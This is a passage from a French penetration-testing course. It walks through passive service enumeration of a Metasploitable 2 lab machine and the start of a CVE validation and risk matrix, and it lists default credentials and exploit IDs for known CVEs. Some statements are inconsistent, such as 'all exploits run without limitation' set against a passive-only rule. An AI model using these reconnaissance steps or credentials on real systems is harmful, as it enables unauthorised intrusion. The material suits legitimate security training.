  "mysql --connect-timeout=5 --skip-ssl -h 192.168.56.103 -u root --protocol=TCP -e 'SELECT VERSION();'"
```

**Explication de la commande**

- `prouve ... mysql-version.txt` : enregistre la version et le code retour.
- `mysql` : client MySQL en ligne de commande.
- `--connect-timeout=5` : délai de connexion limité à 5 secondes.
- `--skip-ssl` : désactive TLS, nécessaire avec un serveur ancien.
- `-h 192.168.56.103` : hôte cible.
- `-u root` : compte de test sans mot de passe.
- `--protocol=TCP` : force la connexion TCP.
- `-e 'SELECT VERSION();'` : exécute une requête en lecture seule.
- Piège courant : créer une base ou modifier une table ; la commande doit rester en lecture seule.

**Résultat attendu**

```text
VERSION()
5.0.51a-3ubuntu5
```

Le compte `root` sans mot de passe répond. C'est une configuration critique de Metasploitable 2.

**Preuve** — `preuves/ch1-lab5/mysql-version.txt`.

#### Étape 10 — PostgreSQL, port 5432

**But** — lire la version exacte de PostgreSQL avec le compte de test, sans modifier la base.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — client `psql` installé ; service PostgreSQL actif.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab5/psql-version.txt bash -c \
  "PGPASSWORD=postgres timeout 10 psql -h 192.168.56.103 -U postgres -c 'SELECT version();'"
```

**Explication de la commande**

- `prouve ... psql-version.txt` : enregistre la version et le code retour.
- `PGPASSWORD=postgres` : fournit le mot de passe du compte de test sans invite.
- `timeout 10` : borne la connexion à 10 secondes.
- `psql` : client PostgreSQL.
- `-h 192.168.56.103` : hôte cible.
- `-U postgres` : compte de test.
- `-c 'SELECT version();'` : requête en lecture seule.
- Piège courant : créer une table ou élever les privilèges ; la commande doit rester en lecture seule.

**Résultat attendu**

```text
PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
```

La version exacte est `8.3.1`, alors que Nmap affichait la plage `8.3.0 - 8.3.7`. Le compte `postgres` avec le mot de passe `postgres` est un compte de test documenté.

**Preuve** — `preuves/ch1-lab5/psql-version.txt`.

#### Étape 11 — VNC, port 5900

**But** — identifier la version du protocole VNC et les types d'authentification annoncés, sans tester de mot de passe.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — `nmap` et accès `sudo`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab5/vnc-info.txt bash -c \
  "echo kali | sudo -S -p '' nmap -sV -n -p 5900 --script vnc-info 192.168.56.103"
```

**Explication de la commande**

- `prouve ... vnc-info.txt` : enregistre l'identification VNC.
- `nmap -sV -n -p 5900` : détection de version sur le port VNC.
- `--script vnc-info` : interroge la version du protocole et les types de sécurité.
- `echo kali | sudo -S -p ''` : fournit le mot de passe à `sudo`.
- Piège courant : lancer `vncviewer` avec des identifiants réels ; `vnc-info` ne teste pas le mot de passe et le lab reste passif.

**Résultat attendu**

```text
5900/tcp open  vnc     VNC (protocol 3.3)
| vnc-info:
|   Protocol version: 3.3
|   Security types:
|_    VNC Authentication (2)
```

VNC est exposé avec une authentification par mot de passe.

**Preuve** — `preuves/ch1-lab5/vnc-info.txt`.

#### Étape 12 — X11, port 6000

**But** — vérifier si le serveur X11 accepte une connexion non authentifiée et documenter un résultat négatif.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — `xdpyinfo` installé sur Kali.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab5/x11-access.txt bash -c \
  "timeout 8 xdpyinfo -display 192.168.56.103:0"
```

**Explication de la commande**

- `prouve ... x11-access.txt` : enregistre la tentative et son code retour.
- `timeout 8` : borne la tentative à 8 secondes.
- `xdpyinfo` : interroge un serveur X11.
- `-display 192.168.56.103:0` : cible l'affichage `:0` de Metasploitable 2.
- Piège courant : conclure que le port est fermé ; Nmap le voit `open`, mais X11 refuse la connexion non authentifiée. Ne cherchez pas à contourner l'authentification.

**Résultat attendu**

```text
Client is not authorized to connect to Server
xdpyinfo:  unable to open display "192.168.56.103:0".
# rc=1
```

Le service X11 répond, mais refuse la connexion non authentifiée. C'est un **résultat négatif attendu**.

**Preuve** — `preuves/ch1-lab5/x11-access.txt`.

#### Étape 13 — IRC, ports 6667 et 6697

**But** — relever la bannière IRC et la version du service sans créer de canal ni enregistrer de compte.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — `nc`, `nmap` et accès `sudo`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab5/irc-banner.txt bash -c \
  "timeout 8 bash -c 'printf \"NICK lab\\r\\nUSER lab 0 * :lab\\r\\nQUIT\\r\\n\" | nc -w 3 192.168.56.103 6667'"
prouve preuves/ch1-lab5/irc-version.txt bash -c \
  "echo kali | sudo -S -p '' nmap -sV -n -p 6667,6697 --script irc-info 192.168.56.103"
```

**Explication de la commande**

- `prouve ... irc-banner.txt` : enregistre la bannière IRC.
- `printf "NICK lab\\r\\nUSER lab 0 * :lab\\r\\nQUIT\\r\\n"` : envoie les commandes minimales d'un client IRC, puis quitte.
- `nc -w 3` : connexion TCP avec délai d'attente de 3 secondes.
- `prouve ... irc-version.txt` : enregistre l'identification Nmap.
- `nmap -sV -n -p 6667,6697` : détection de version sur les ports IRC.
- `--script irc-info` : script NSE d'information IRC.
- Piège courant : s'enregistrer ou créer un canal ; la bannière suffit.

**Résultat attendu**

```text
:irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
```

UnrealIRCd répond et révèle son nom d'hôte. La version exacte `3.2.8.1` vient de `nmap -sV` et de la matrice CVE du Lab-02.

**Preuve** — `preuves/ch1-lab5/irc-banner.txt` et `preuves/ch1-lab5/irc-version.txt`.

#### Étape 14 — Tomcat et AJP13, ports 8180 et 8009

**But** — identifier Tomcat, sa page d'accueil et le connecteur AJP13, sans tester le gestionnaire avec des mots de passe.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — `curl`, `whatweb`, `nikto`, `nmap` et accès `sudo`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab5/tomcat-headers.txt bash -c \
  "curl --max-time 10 -sS -D - -o /dev/null http://192.168.56.103:8180/"
prouve preuves/ch1-lab5/tomcat-page.txt bash -c \
  "curl --max-time 10 -sS http://192.168.56.103:8180/ | head -20"
prouve preuves/ch1-lab5/whatweb-8180.txt whatweb -a 3 --color=never http://192.168.56.103:8180/
prouve preuves/ch1-lab5/nikto-8180.txt bash -c \
  "timeout 100 nikto -h http://192.168.56.103:8180 -nointeractive -maxtime 80s -Display V 2>&1 | sed -r 's/\\x1B\\[[0-9;]*[mK]//g'"
prouve preuves/ch1-lab5/ajp13-version.txt bash -c \
  "echo kali | sudo -S -p '' nmap -sV -n -p 8009 192.168.56.103"
```

**Explication de la commande**

- `prouve ... tomcat-headers.txt` : enregistre les en-têtes HTTP de Tomcat.
- `curl -D - -o /dev/null` : affiche les en-têtes et supprime le corps.
- `prouve ... tomcat-page.txt` : enregistre le début de la page d'accueil.
- `curl -sS ... | head -20` : récupère la page et limite l'affichage à 20 lignes.
- `prouve ... whatweb-8180.txt` : enregistre la technologie détectée.
- `whatweb -a 3 --color=never` : analyse agressive sans séquences ANSI.
- `prouve ... nikto-8180.txt` : enregistre le scan de Tomcat.
- `nikto -h ... -maxtime 80s` : scan non interactif borné.
- `prouve ... ajp13-version.txt` : enregistre l'identification du connecteur AJP13.
- `nmap -sV -n -p 8009` : détection de version sur le port AJP13.
- Piège courant : tester le gestionnaire Tomcat avec des mots de passe par défaut ; ce serait du brute force.

**Résultat attendu**

```text
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1

http://192.168.56.103:8180/ [200 OK] Apache, HTTPServer[Apache-Coyote/1.1], Title[Apache Tomcat/5.5]

8009/tcp open  ajp13  Apache Jserv (Protocol v1.3)
```

Tomcat `5.5` est exposé sur `8180`, et le connecteur AJP13 sur `8009`. AJP13 ne doit pas être exposé hors d'un frontal web. `nikto` identifie Tomcat via le favicon.

**Preuve** — `preuves/ch1-lab5/tomcat-headers.txt`, `tomcat-page.txt`, `whatweb-8180.txt`, `nikto-8180.txt` et `ajp13-version.txt`.

#### Étape 15 — RMI, port 1099

**But** — identifier le service RMI et documenter l'absence de résultat du script d'énumération du registre.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — `nmap` et accès `sudo`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab5/rmi-dumpregistry.txt bash -c \
  "echo kali | sudo -S -p '' nmap -sV -n -p 1099 --script rmi-dumpregistry 192.168.56.103"
```

**Explication de la commande**

- `prouve ... rmi-dumpregistry.txt` : enregistre l'identification RMI et le résultat du script.
- `nmap -sV -n -p 1099` : détection de version sur le port RMI.
- `--script rmi-dumpregistry` : tente d'énumérer le registre RMI.
- `echo kali | sudo -S -p ''` : fournit le mot de passe à `sudo`.
- Piège courant : conclure que le service est absent parce que le script ne retourne rien ; le service reste identifié, mais le registre n'est pas énumérable avec ce script.

**Résultat attendu**

```text
1099/tcp open  java-rmi  GNU Classpath grmiregistry
```

Le script `rmi-dumpregistry` ne produit aucune sortie dans notre test. Documentez la limite : « RMI identifié, registre non énuméré ». Ne lancez pas d'outil d'exploitation RMI.

**Preuve** — `preuves/ch1-lab5/rmi-dumpregistry.txt`.

#### Étape 16 — distcc, port 3632

**But** — identifier la version de distccd sans soumettre de compilation.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — `nmap` et accès `sudo`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab5/distcc-version.txt bash -c \
  "echo kali | sudo -S -p '' nmap -sV -n -p 3632 192.168.56.103"
```

**Explication de la commande**

- `prouve ... distcc-version.txt` : enregistre l'identification de distccd.
- `nmap -sV -n -p 3632` : détection de version sur le port distcc.
- `echo kali | sudo -S -p ''` : fournit le mot de passe à `sudo`.
- Piège courant : soumettre une compilation ; ce serait une exécution de commande distante. La version suffit à documenter le service.

**Résultat attendu**

```text
3632/tcp open  distccd  distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```

distccd est un compilateur distribué. La version est identifiée ; la CVE-2004-2687 est validée dans le Lab-02.

**Preuve** — `preuves/ch1-lab5/distcc-version.txt`.

#### Étape 17 — r-services, ports 512, 513 et 514

**But** — identifier les r-services exposés sans tester `rsh` ni `rlogin`.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — `nmap` et accès `sudo`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab5/rservices.txt bash -c \
  "echo kali | sudo -S -p '' nmap -sV -n -p 512,513,514 192.168.56.103"
```

**Explication de la commande**

- `prouve ... rservices.txt` : enregistre l'identification des r-services.
- `nmap -sV -n -p 512,513,514` : détection de version sur les ports `exec`, `login` et `shell`.
- `echo kali | sudo -S -p ''` : fournit le mot de passe à `sudo`.
- Piège courant : utiliser `rsh` ou `rlogin` ; ces services transmettent les identifiants en clair. La version Nmap suffit.

**Résultat attendu**

```text
512/tcp open  exec   netkit-rsh rexecd
513/tcp open  login  OpenBSD or Solaris rlogind
514/tcp open  shell  Netkit rshd
```

Les r-services sont exposés. Ils transmettent les identifiants en clair et ne doivent pas être utilisés.

**Preuve** — `preuves/ch1-lab5/rservices.txt`.

#### Étape 18 — Bindshell, port 1524

**But** — documenter l'exposition d'un shell root sur le port 1524 sans s'y connecter.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — `nmap` et accès `sudo`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab5/bindshell-version.txt bash -c \
  "echo kali | sudo -S -p '' nmap -sV -n -p 1524 192.168.56.103"
```

**Explication de la commande**

- `prouve ... bindshell-version.txt` : enregistre l'identification du port 1524.
- `nmap -sV -n -p 1524` : détection de version sur le port du bindshell.
- `echo kali | sudo -S -p ''` : fournit le mot de passe à `sudo`.
- Piège courant : se connecter au shell root ; la seule action autorisée est de documenter le port, la version et la mitigation : fermeture du port, suppression du service, filtrage réseau.

**Résultat attendu**

```text
1524/tcp open  bindshell  Metasploitable root shell
```

Metasploitable 2 expose un shell root sur `1524`. **Ne vous y connectez pas.**

**Preuve** — `preuves/ch1-lab5/bindshell-version.txt`.

#### Étape 19 — Contrôle de couverture

**But** — vérifier que chaque preuve contient un code retour, identifier les fichiers incomplets et calculer les empreintes.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — preuves des étapes 1 à 18 présentes dans `preuves/ch1-lab5/`.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
grep -H '^# rc=' preuves/ch1-lab5/*.txt | wc -l
grep -L '^# rc=' preuves/ch1-lab5/*.txt
sha256sum preuves/ch1-lab5/*.txt > preuves/ch1-lab5/SHA256SUMS
```

**Explication de la commande**

- `grep -H '^# rc=' preuves/ch1-lab5/*.txt` : affiche le nom de chaque fichier et sa ligne de code retour.
- `| wc -l` : compte le nombre de preuves qui contiennent un `# rc=`.
- `grep -L '^# rc=' preuves/ch1-lab5/*.txt` : liste les fichiers qui ne contiennent pas de code retour ; une sortie vide signifie que toutes les preuves sont complètes.
- `sha256sum preuves/ch1-lab5/*.txt` : calcule les empreintes des preuves.
- `> preuves/ch1-lab5/SHA256SUMS` : écrit les empreintes dans le fichier de sommes.
- Piège courant : relancer `sha256sum` après avoir créé `SHA256SUMS` en l'incluant ; le fichier de sommes ne doit pas s'inclure.

**Résultat attendu**

Un `# rc=` par fichier, aucune sortie pour `grep -L`, puis les empreintes. Si `grep -L` affiche un fichier, la preuve est incomplète : relancez la commande.

**Preuve** — `preuves/ch1-lab5/SHA256SUMS` ; le contrôle de couverture est visible dans la sortie de l'étape.

### En conclusion

Vous avez une matrice de 19 services, des preuves réelles, des résultats négatifs documentés et un échec d'outil expliqué. Le Lab-06 transforme cette connaissance en matrice de risques et en décisions de mitigation.

**Résultats attendus**

| Service | Information attendue | Preuve |
|---|---|---|
| FTP 21 | login anonyme autorisé, racine vide | `ftp-anon.txt` |
| FTP 2121 | ProFTPD 1.3.1 | `ftp-alt-version.txt` |
| SSH 22 | bannière, auth refusée sans identifiant | `ssh-banner.txt` |
| Telnet 23 | Linux telnetd, négociation IAC | `telnet-*.txt` |
| SMTP 25 | Postfix, STARTTLS, VRFY | `smtp-banner.txt` |
| DNS 53 | BIND 9.4.2, AXFR refusé | `dns-*.txt` |
| HTTP 80 | Apache 2.2.8, PHP 5.2.4, phpinfo | `http-*.txt` |
| RPC/NFS | portmapper, export `/ *` | `rpcinfo.txt`, `showmount.txt` |
| SMB | Samba 3.0.20, `tmp` et `IPC$` RW | `smb-*.txt` |
| MySQL | 5.0.51a-3ubuntu5, root sans mot de passe | `mysql-version.txt` |
| PostgreSQL | 8.3.1 | `psql-version.txt` |
| VNC | protocole 3.3, auth VNC | `vnc-info.txt` |
| X11 | accès refusé | `x11-access.txt` |
| IRC | UnrealIRCd, nom d'hôte | `irc-banner.txt` |
| Tomcat | 5.5, AJP13 | `tomcat-*.txt`, `ajp13-version.txt` |
| RMI | GNU Classpath, registre non énuméré | `rmi-dumpregistry.txt` |
| distcc | distccd v1 | `distcc-version.txt` |
| r-services | rexecd, rlogind, rshd | `rservices.txt` |
| bindshell | shell root exposé | `bindshell-version.txt` |

**Critères de réussite**

- [ ] Chaque service de la matrice a au moins une preuve avec `# rc=`.
- [ ] Les versions sont lues, pas devinées.
- [ ] Les résultats négatifs (X11, AXFR, RMI) sont documentés comme négatifs.
- [ ] L'échec `smbmap` est documenté avec le fallback.
- [ ] L'énumération du Lab-05 reste passive ; tous les exploits sont exécutés dans le lab sans limitation (Lab-07).
- [ ] La matrice de couverture est complète.
- [ ] Les preuves sont hachées.

## Lab-06 — Validation CVE et matrice de risques

### Énoncé / Contexte

Le Lab-02 a produit des candidats. Le Lab-05 a confirmé les services et les versions. Ce lab transforme les candidats en **décisions** : validé, rejeté, conditionnel ou non vérifiable, puis en **risques** avec une probabilité, un impact, une mitigation et une détection.

**Place dans la chaîne** — après l'énumération (Lab-05), avant l'exploitation (Lab-07).

**Objectifs pédagogiques** — à la fin de ce lab, vous devez être capable de :

- produire une matrice de risques à partir de preuves, sans CVSS inventé ;
- distinguer une vulnérabilité validée d'une simple correspondance de version ;
- rejeter un candidat hors plage ;
- documenter un cas non vérifiable ;
- proposer une mitigation préventive, détective et corrective par ligne ;
- appliquer la règle d'exploitation du parcours : tous les exploits sont exécutés dans le lab sans limitation.

**Règle de risque**

Ce lab utilise une échelle **qualitative** définie localement, pas un score CVSS. La probabilité est `certaine`, `probable`, `faible` ou `inconnue`. L'impact est `critique`, `élevé`, `moyen` ou `faible`. Le risque est dérivé par la table ci-dessous. Cette règle est reproductible et ne dépend d'aucune donnée externe.

| Probabilité \ Impact | Critique | Élevé | Moyen | Faible |
|---|---|---|---|---|
| Certaine | Critique | Élevé | Moyen | Faible |
| Probable | Élevé | Élevé | Moyen | Faible |
| Faible | Moyen | Moyen | Faible | Faible |
| Inconnue | Inconnu | Inconnu | Inconnu | Inconnu |

Règles de lecture :

- `certaine` : version exacte dans la plage + exploit public vérifié ;
- `probable` : version dans la plage mais condition d'accès ou de configuration à confirmer ;
- `faible` : version hors plage, service non exposé ou configuration bloquante ;
- `inconnue` : aucune donnée locale permettant de conclure.

La table est volontairement simple. `certaine` + `critique` donne `critique`. `probable` + `élevé` donne `élevé`. `faible` + `faible` donne `faible`. `inconnue` donne `inconnu`. Cette règle ne remplace pas une analyse CVSS ; elle donne une priorisation cohérente avec les preuves locales.

**Grille de décision**

Appliquez cette grille avant de construire le CSV :

| CVE | Service | Version observée | Plage du titre | Décision |
|---|---|---|---|---|
| CVE-2011-2523 | vsftpd | 2.3.4 | 2.3.4 | validée |
| CVE-2007-2447 | Samba | 3.0.20-Debian | `3.0.20 < 3.0.25rc3` | validée |
| CVE-2010-2075 | UnrealIRCd | 3.2.8.1 | 3.2.8.1 | validée |
| CVE-2004-2687 | distccd | v1 | daemon v1 | validée |
| CVE-2010-4221 | ProFTPD | 1.3.1 | `1.3.2 rc3 < 1.3.3b` | rejetée |
| CVE-2011-3192 | Apache | 2.2.8 | DoS, plage à vérifier | documentée |
| CVE-2012-1823 | PHP | 5.2.4 | `< 5.3.12 / < 5.4.2` | conditionnelle |
| CVE-2008-0166 | OpenSSL | 0.9.8g-4ubuntu3 | `< 0.9.8g-9` | validée (version) |
| CVE-2021-4158 | QEMU (hôte) | 6.0–6.x | aucun résultat local ; hors cible | hors périmètre |

Chaque décision est justifiée par une ligne du tableau ou une preuve. Aucune décision ne repose sur le seul nom du service. vsftpd `2.3.4` est exactement la version du titre. Samba `3.0.20` est dans `3.0.20 < 3.0.25rc3`. UnrealIRCd `3.2.8.1` est exactement la version du titre. distccd `v1` correspond. ProFTPD `1.3.1` est hors plage (`1.3.2 rc3 < 1.3.3b`) : rejeté. BIND `9.4.2` est hors plage (`9.4.1 < 9.4.2`) : rejeté. Samba `7701` (`< 3.0.20`) : rejeté. Apache et PHP sont conditionnels. OpenSSL est validé pour la version. CVE-2021-4158 est une CVE QEMU/ACPI de l'hôte, hors périmètre du lab.

**Plan MITRE ATT&CK**

| Élément | Valeur |
|---|---|
| Tactique | Resource Development (TA0042) |
| Technique | T1588.006 Vulnerabilities |
| Source de données | Base Exploit-DB locale, XML Nmap, matrice de risques |
| Contrôle défensif | Gestion des vulnérabilités, priorisation, patch management |
| Détection | Écart entre version inventoriée et version corrigée, présence d'un exploit public |

**Prérequis**

- XML Nmap du Lab-01 ou Lab-02 : `preuves/ch1-lab1/nmap-versions.xml`.
- `searchsploit` local, sans Internet.
- Matrice de validation du Lab-02.
- Versions exactes du Lab-05 : vsftpd `2.3.4`, Samba `3.0.20-Debian`, UnrealIRCd `3.2.8.1`, distccd `v1`, ProFTPD `1.3.1`, MySQL `5.0.51a-3ubuntu5`, PostgreSQL `8.3.1`, Apache `2.2.8`, PHP `5.2.4`, OpenSSL `0.9.8g-4ubuntu3`, noyau `2.6.24-16-server`.
- Répertoire de travail : `preuves/ch1-lab6/`.

### Outils et commandes utilisées

| Outil | Commande | Rôle |
|---|---|---|
| `searchsploit` | `--nmap`, `--cve`, `-p` | Recherche locale et métadonnées |
| `grep` / `awk` | Extraction des champs CVE et versions | Qualification des candidates |
| `prouve` | `prouve preuves/ch1-lab6/... commande` | Preuve datée avec code retour |
| `sha256sum` | `sha256sum -c SHA256SUMS` | Intégrité de la matrice et des preuves |

### Commande et laboratoire étape par étape

#### Étape 1 — Vérifier le XML et le régénérer si nécessaire

**But** — contrôler que le XML Nmap source existe et contient une déclaration XML valide ; le régénérer s'il manque.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — XML du Lab-01 disponible, ou accès à Metasploitable 2 pour le régénérer.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
ls -l preuves/ch1-lab1/nmap-versions.xml
head -5 preuves/ch1-lab1/nmap-versions.xml
prouve preuves/ch1-lab6/nmap-versions.xml bash -c \
  "echo kali | sudo -S -p '' nmap -sS -n -sV -p 21,22,80,139,445,3306,5432,2121,3632,6667,8180,8009 -oX preuves/ch1-lab6/nmap-versions.xml 192.168.56.103"
```

**Explication de la commande**

- `ls -l preuves/ch1-lab1/nmap-versions.xml` : vérifie l'existence et la taille du XML.
- `head -5` : affiche les premières lignes, dont la déclaration XML.
- `prouve ... nmap-versions.xml` : régénère le XML et l'enregistre dans les preuves du Lab-06.
- `nmap -sS -n -sV` : scan SYN, sans DNS, avec détection de versions.
- `-p 21,22,...` : ports utilisés par les services du lab.
- `-oX preuves/ch1-lab6/nmap-versions.xml` : sortie XML.
- Piège courant : utiliser un XML tronqué ; `searchsploit --nmap` produit alors des résultats incomplets.

**Résultat attendu**

Le fichier existe et commence par `<?xml version="1.0"?>`.

**Preuve** — `preuves/ch1-lab6/nmap-versions.xml`.

#### Étape 2 — Croiser le XML avec Exploit-DB

**But** — générer une requête par produit détecté et recueillir les candidats, sans les considérer comme validés.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — XML valide de l'étape 1.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve preuves/ch1-lab6/searchsploit-nmap.txt \
  searchsploit --disable-colour --nmap preuves/ch1-lab6/nmap-versions.xml
```

**Explication de la commande**

- `prouve ... searchsploit-nmap.txt` : enregistre la sortie complète et le code retour.
- `searchsploit` : interroge la base locale.
- `--disable-colour` : supprime les séquences ANSI.
- `--nmap preuves/ch1-lab6/nmap-versions.xml` : transforme chaque produit du XML en requête `searchsploit -t`.
- Le mode XML ignore les termes trop généraux, comme `ftp`.
- Piège courant : recopier tous les résultats dans la matrice sans comparer les plages de versions ; la sortie est un point de départ.

**Résultat attendu**

Des blocs `searchsploit -t ...` pour chaque produit, avec les résultats correspondants. Le mode XML ne valide pas les plages de versions.

**Preuve** — `preuves/ch1-lab6/searchsploit-nmap.txt`.

#### Étape 3 — Rechercher chaque CVE de la matrice

**But** — vérifier la présence locale de chaque CVE et recenser les exploits associés.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — base Exploit-DB locale ; liste des neuf CVE de la grille de décision.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
for cve in 2011-2523 2007-2447 2010-2075 2004-2687 2010-4221 2011-3192 2012-1823 2008-0166 2021-4158; do
  prouve "preuves/ch1-lab6/cve-$cve.txt" \
    searchsploit --disable-colour --cve "$cve"
done
```

**Explication de la commande**

- `for cve in ...; do ... done` : boucle sur les neuf identifiants CVE.
- `prouve "preuves/ch1-lab6/cve-$cve.txt"` : crée une preuve par CVE.
- `searchsploit` : interroge la base locale.
- `--disable-colour` : sortie sans séquences ANSI.
- `--cve "$cve"` : recherche le code CVE dans les métadonnées.
- Piège courant : conclure qu'une CVE est absente parce qu'un seul identifiant est recherché ; vérifiez le code complet et la plage de versions.

**Résultat attendu**

```text
CVE-2011-2523 : 49757.py, 17491.rb
CVE-2007-2447 : 16320.rb
CVE-2010-2075 : 16922.rb, 13853.pl
CVE-2004-2687 : 9915.rb
CVE-2010-4221 : 16851.rb, 16878.rb
CVE-2011-3192 : 18221.c, 17696.pl
CVE-2012-1823 : 29290.c, 29316.py
CVE-2008-0166 : 5622.txt, 5632.rb
CVE-2021-4158 : No Results
```

Les quatre CVE principales ont des résultats locaux. CVE-2010-4221 existe mais concerne une autre plage. CVE-2011-3192 et CVE-2012-1823 sont des CVE web, documentées mais non exécutées. CVE-2008-0166 concerne OpenSSL. CVE-2021-4158 n'a aucun résultat local parce qu'elle ne concerne pas Metasploitable 2 : c'est une vulnérabilité QEMU/ACPI de l'hôte hyperviseur, hors périmètre et interdite à l'exploitation (DoS).

**Preuve** — `preuves/ch1-lab6/cve-2011-2523.txt`, `cve-2007-2447.txt`, `cve-2010-2075.txt`, `cve-2004-2687.txt`, `cve-2010-4221.txt`, `cve-2011-3192.txt`, `cve-2012-1823.txt`, `cve-2008-0166.txt` et `cve-2021-4158.txt`.

#### Étape 4 — Lire les métadonnées des quatre exploits principaux

**But** — confirmer le titre, le chemin local, les codes CVE et l'état de vérification des quatre exploits principaux.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — EDB-ID `16320`, `16922`, `17491` et `9915` identifiés à l'étape 3.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
for id in 16320 16922 17491 9915; do
  prouve "preuves/ch1-lab6/edb-$id.txt" searchsploit --disable-colour -p "$id"
done
```

**Explication de la commande**

- `for id in ...; do ... done` : boucle sur les quatre identifiants.
- `prouve "preuves/ch1-lab6/edb-$id.txt"` : crée une preuve par exploit.
- `searchsploit` : interroge la base locale.
- `--disable-colour` : sortie sans séquences ANSI.
- `-p "$id"` : affiche les métadonnées de l'exploit.
- `Verified: True` : l'exploit a été vérifié par Exploit-DB ; cela ne garantit pas qu'il fonctionne sur cette cible.
- Piège courant : confondre `Verified: True` avec « exploitable sur cette cible » ; la version et la configuration restent à valider.

**Résultat attendu**

Pour chaque EDB-ID, le titre, l'URL, le chemin local, les codes CVE/OSVDB, `Verified` et le type de fichier.

**Preuve** — `preuves/ch1-lab6/edb-16320.txt`, `edb-16922.txt`, `edb-17491.txt` et `edb-9915.txt`.

#### Étape 5 — Construire la matrice CSV

**But** — produire la matrice de risques à partir de la grille de décision et de la règle de risque, avec une ligne par CVE.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — décisions de la grille de décision ; preuves des étapes 1 à 4.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
cat > preuves/ch1-lab6/matrice-risques.csv <<'CSV'
cve,service,version,port,decision,probabilite,impact,risque,mitigation,detection
CVE-2011-2523,vsftpd,2.3.4,21,validee,certaine,critique,critique,Remplacer vsftpd ou fermer le port 21,Connexions vers 21 et pics d authentification
CVE-2007-2447,Samba,3.0.20-Debian,139;445,validee,certaine,critique,critique,Desactiver SMB1 et username map script,Evenements SMB et creation de processus
CVE-2010-2075,UnrealIRCd,3.2.8.1,6667;6697,validee,certaine,critique,critique,Remplacer le binaire et filtrer l IRC,Connexions IRC et commandes anormales
CVE-2004-2687,distccd,v1,3632,validee,certaine,critique,critique,Desactiver distcc,Connexions vers 3632 et executions de compilateur
CVE-2010-4221,ProFTPD,1.3.1,2121,rejetee,faible,faible,faible,Mettre a jour par precaution,Surveillance des versions
CVE-2011-3192,Apache,2.2.8,80,documentee,probable,eleve,eleve,Patch et limitation de taille de requete,Latence et volume HTTP anormal
CVE-2012-1823,PHP,5.2.4,80,conditionnelle,probable,eleve,eleve,Desactiver CGI et mettre a jour PHP,Requetes cgi-bin et processus inattendus
CVE-2008-0166,OpenSSL,0.9.8g-4ubuntu3,22;80;443,validee version,certaine,eleve,eleve,Regenerer les cles et mettre a jour OpenSSL,Reutilisation de cles et certificats faibles
